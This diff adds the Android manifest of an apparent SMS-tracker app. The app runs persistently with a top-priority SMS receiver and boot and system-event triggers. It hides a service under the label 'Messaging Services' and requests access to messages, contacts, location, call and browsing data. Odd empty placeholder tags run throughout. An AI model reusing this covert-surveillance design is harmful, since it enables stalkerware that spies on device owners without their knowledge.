@@ -1,0 +1,84 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.gizmoquip.smstrackerdemo">
+    <application android:allowBackup="false" android:allowClearUserData="false" android:icon="@drawable/sms_tracker_icon72x72" android:label="@string/app_name" android:persistent="true">
+        <activity android:exported="true" android:label="@string/app_name" android:name=".SvcLauncher">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"><nothingHere/></action>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:exported="true" android:label="@string/app_name" android:name=".RegistrationUIActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"><nothingHere/></action>
+                <category android:name="android.intent.category.LAUNCHER"><nothingHere/></category>
+            </intent-filter>
+        </activity>
+        <activity android:exported="true" android:name=".PrivacyPolicyUI"><nothingHere/></activity>
+        <receiver android:name=".SystemEventBroadcastReciever">
+            <intent-filter>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"><nothingHere/></action>
+                <action android:name="android.intent.action.PACKAGE_FIRST_LAUNCH"><nothingHere/></action>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"><nothingHere/></action>
+                <action android:name="android.intent.action.PACKAGE_INSTALL"><nothingHere/></action>
+            <android-data android:scheme="package"><nothingHere/></android-data>
+                </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"><nothingHere/></action>
+                <action android:name="com.android.vending.INSTALL_REFERRER"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_AIRPLANE_MODE_CHANGED"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_BATTERY_LOW"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_BATTERY_OKAY"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_CAMERA_BUTTON"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_DEVICE_STORAGE_LOW"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_DEVICE_STORAGE_OK"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_SCREEN_ON"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_SCREEN_OFF"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_SHUTDOWN"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_TIMEZONE_CHANGED"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_UID_REMOVED"><nothingHere/></action>
+                <action android:name="android.intent.action.ACTION_USER_PRESENT"><nothingHere/></action>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"><nothingHere/></action>
+                <action android:name="android.net.wifi.supplicant.CONNECTION_CHANGE"><nothingHere/></action>
+                <action android:name="android.intent.action.SERVICE_STATE"><nothingHere/></action>
+            <category android:name="android.intent.category.HOME"><nothingHere/></category>
+                </intent-filter>
+        </receiver>
+        <receiver android:name=".SmsReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"><nothingHere/></action>
+            </intent-filter>
+        </receiver>
+    <service android:enabled="true" android:label="Messaging Services" android:name=".MainService">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"><nothingHere/></action>
+                <action android:name="android.intent.action.PHONE_STATE"><nothingHere/></action>
+                <action android:name="android.intent.action.DELETE"><nothingHere/></action>
+                <action android:name="android.intent.action.VIEW"><nothingHere/></action>
+                <action android:name="com.gizmoquip.newmessage"><nothingHere/></action>
+            </intent-filter>
+        </service>
+        </application>
+<uses-feature android:name="android.hardware.telephony" android:required="false"><nothingHere/></uses-feature>
+    <uses-feature android:name="android.hardware.location" android:required="false"><nothingHere/></uses-feature>
+    <uses-feature android:name="android.hardware.location.network" android:required="false"><nothingHere/></uses-feature>
+    <uses-feature android:name="android.hardware.location.gps" android:required="false"><nothingHere/></uses-feature>
+    <uses-feature android:name="android.hardware.microphone" android:required="false"><nothingHere/></uses-feature>
+    <uses-permission android:name="android.permission.READ_SMS"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.READ_MMS"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.INTERNET"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.RECEIVE_MMS"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.READ_CONTACTS"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.GET_TASKS"><nothingHere/></uses-permission>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.WAKE_LOCK"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.BROADCAST_STICKY"><nothingHere/></uses-permission>
+    </manifest>
